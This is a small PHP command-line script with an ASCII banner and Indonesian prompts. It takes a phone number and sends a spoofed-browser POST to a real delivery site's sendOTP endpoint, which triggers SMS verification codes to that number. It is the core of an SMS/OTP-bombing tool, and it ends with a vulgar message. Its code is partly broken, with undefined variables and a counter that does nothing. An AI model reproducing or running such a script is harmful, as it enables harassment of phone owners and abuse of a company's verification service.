<?php
function reqotp($no){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }

print "\033[0;32m 
=======================================
       ____            _____     
      / __ \__  ______/ /   |____
     / /_/ / / / / __  / /| /_  /
    / _, _/ /_/ / /_/ / ___ |/ /_
   /_/ |_|\__,_/\__,_/_/  |_/___/


=======================================
\n Tinggal Pakek Aja Ribet \n " ;
echo " \033[36;1m Nomor 08xx: ";
$nomor = trim(fgets(STDIN));
$execute = reqotp($nomor);
print $execute;
print "\033[36;1m password terkirim ngentod \n";


?>
